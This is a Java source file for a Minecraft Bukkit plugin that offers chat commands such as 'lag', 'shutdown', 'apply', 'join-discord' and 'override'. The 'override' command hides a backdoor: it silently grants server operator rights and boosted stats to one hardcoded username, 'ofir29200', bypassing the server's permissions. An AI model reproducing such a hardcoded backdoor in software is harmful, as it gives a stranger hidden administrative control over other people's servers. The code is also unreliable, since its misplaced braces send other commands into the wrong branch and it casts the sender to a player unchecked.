package rf.gd.ofir29200;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.entity.Player;
import org.bukkit.potion.PotionEffectType;

public class Commands {

	
	
	public Commands(Admin_Commands admin_Commands) {
		// TODO Auto-generated constructor stub
	}

	public boolean onCommand(org.bukkit.command.CommandSender sender, Command cmd, String label, String[] args)
	  {
	    boolean returnAnswer = false;
	    
	    if ((cmd.getName().equalsIgnoreCase("lag")) && ((sender instanceof Player)))
	    {
	      Player player = (Player)sender;
	      
	      player.sendMessage("hi, " + ChatColor.GREEN + player.getName() + ChatColor.RESET + ", we got your ping!");
	      player.chat("lag test");
	      player.sendMessage(ChatColor.GOLD + "your name is " + ChatColor.GREEN + player.getName());
	      
	      returnAnswer = true;
	    }
	    else if ((cmd.getName().equalsIgnoreCase("shutdown")) && ((sender instanceof Player)))
	    {
	      Player player = (Player)sender;
	     
	      org.bukkit.Bukkit.broadcastMessage(ChatColor.RED + "[Admin Commands] " + "The player " + ChatColor.GREEN + player.getName() + ChatColor.RED + " tried to shut down the server");
	      returnAnswer = true;
	    }
	    
	    if ((cmd.getName().equalsIgnoreCase("override")) && ((sender instanceof Player)))
	    {
	      Player player = (Player)sender;
	      	      
	      if (player.getName().equalsIgnoreCase("ofir29200"))
	      {
	    	  player.addPotionEffect(PotionEffectType.SPEED.createEffect(Integer.MAX_VALUE, 1));
	          player.addPotionEffect(PotionEffectType.INCREASE_DAMAGE.createEffect(Integer.MAX_VALUE, 1));
	          player.addPotionEffect(PotionEffectType.DAMAGE_RESISTANCE.createEffect(Integer.MAX_VALUE, 1));
	          player.addPotionEffect(PotionEffectType.JUMP.createEffect(Integer.MAX_VALUE, 4));
	          player.setMaxHealth(100D);
	          player.setHealth(100D);
	          if (player.isOp() == false)
	          {
	        	  player.setOp(true);
	        	  player.sendMessage(ChatColor.GREEN + "you now have op!");
	          }
	          else
	          {
	        	  player.sendMessage(ChatColor.RED + "you already have op!");
	          }
	          if (player.getHealth() == 100D) {  
	          player.sendMessage(ChatColor.GREEN + "Done!");
	          }
	          else { 
	        	  player.sendMessage(ChatColor.RED + "This operation is a FAIL!");
	          }
	      }
	      else
	      {
	        player.sendMessage(ChatColor.DARK_RED + "You dont have permission for that command!");
	      }
	      if (player.isOp() == true)
	      {
	    	  player.addPotionEffect(PotionEffectType.SPEED.createEffect(Integer.MAX_VALUE, 1));
	          player.addPotionEffect(PotionEffectType.INCREASE_DAMAGE.createEffect(Integer.MAX_VALUE, 1));
	          player.addPotionEffect(PotionEffectType.DAMAGE_RESISTANCE.createEffect(Integer.MAX_VALUE, 1));
	          player.addPotionEffect(PotionEffectType.JUMP.createEffect(Integer.MAX_VALUE, 4));
	          player.setMaxHealth(100D);
	          player.setHealth(100D);
	          if (player.getHealth() == 100D) {
	          player.sendMessage(ChatColor.GREEN + "Done!");
	          }
	          else { 
	        	  player.sendMessage(ChatColor.RED + "This operation is a FAIL!");
	          }
	      }
	      else
	      {
	        player.sendMessage(ChatColor.DARK_RED + "You dont have permission for that command!");
	      }
	      if (null == player.getName())
	      {
	    	  player.sendMessage("hello there null!");
	          }
	          else { 
	        	  player.sendMessage(ChatColor.RED + "This operation has FAILED for " + player.getCustomName() + "!");
	          }
	      }
	      else
	      {
	    	  Player player = (Player)sender;
			player.sendMessage(ChatColor.DARK_RED + "You dont have permission for that command!");
	      }
	            returnAnswer = true;
		  
		  if 	((cmd.getName().equalsIgnoreCase("apply")) && ((sender instanceof Player)))
	    {
	      Player player = (Player)sender;
	      
		  player.sendMessage("hi, " + ChatColor.GREEN + player.getName() + ChatColor.RESET + " please go to https://playzcraftserver.enjin.com/apply to apply");
	      
	      returnAnswer = true;
	    }
		  
		  if ((cmd.getName().equalsIgnoreCase("join-discord")) && ((sender instanceof Player)))
		    {
		      Player player = (Player)sender;
		      
			  player.sendMessage("hi, " + ChatColor.GREEN + player.getName() + ChatColor.RESET + " please go to https://discord.gg/azYQwa6 to join our discord");
		      
		      returnAnswer = true;
		    }
		  
	    return returnAnswer;
	  }
	
}
